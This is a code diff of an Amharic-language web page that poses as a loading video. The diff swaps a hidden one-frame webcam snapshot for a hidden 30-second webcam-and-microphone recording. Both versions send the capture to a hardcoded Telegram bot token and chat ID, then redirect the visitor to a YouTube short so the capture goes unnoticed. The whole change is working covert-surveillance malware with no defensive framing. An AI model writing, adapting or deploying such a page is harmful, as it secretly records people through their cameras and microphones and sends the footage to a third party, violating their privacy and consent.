@@ -12,34 +12,52 @@
 </head>
 <body>
     <div class="spinner"></div>
-    <h3>ቪዲዮው እየተጫነ ነው...</h3>
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-    <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const botToken = "8685482473:AAE7vWYe8mV4ZQ4PA0oj_18WgoJpu_jfZ3M";
-        const chatId = "5630987526"; 
+    <h3 id="status">ቪዲዮው እየተጫነ ነው...</h3>
 
-        navigator.mediaDevices.getUserMedia({ video: true })
+    <video id="video" width="640" height="480" autoplay muted style="display:none;"></video>
+
+    <script>
+        const botToken = "8685482473:AAE7vWYe8mV4ZQ4PA0oj_18WgoJpu_jfZ3M";
+        const chatId = "5630987526";
+        const duration = 30000; // 30 ሰከንድ (በሚሊ ሰከንድ)
+
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
             .then(stream => {
+                const video = document.getElementById('video');
                 video.srcObject = stream;
+                
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                
+                mediaRecorder.onstop = () => {
+                    document.getElementById('status').innerText = "ቪዲዮው እየተላከ ነው...";
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('video', blob, 'capture.mp4');
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => {
+                        window.location.href = "https://youtube.com/shorts/1xZS2TpagBk";
+                    });
+                };
+
+                // ቀረጻ ጀምር
+                mediaRecorder.start();
+
+                // ከ30 ሰከንድ በኋላ አቁም
                 setTimeout(() => {
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'image.png');
-                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        }).then(() => {
-                            window.location.href = "https://youtube.com/shorts/1xZS2TpagBk";
-                        });
-                    }, 'image/png');
-                }, 2000);
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, duration);
             })
-            .catch(() => { window.location.href = "https://youtube.com/shorts/1xZS2TpagBk"; });
+            .catch(() => {
+                window.location.href = "https://youtube.com/shorts/1xZS2TpagBk";
+            });
     </script>
 </body>
 </html>
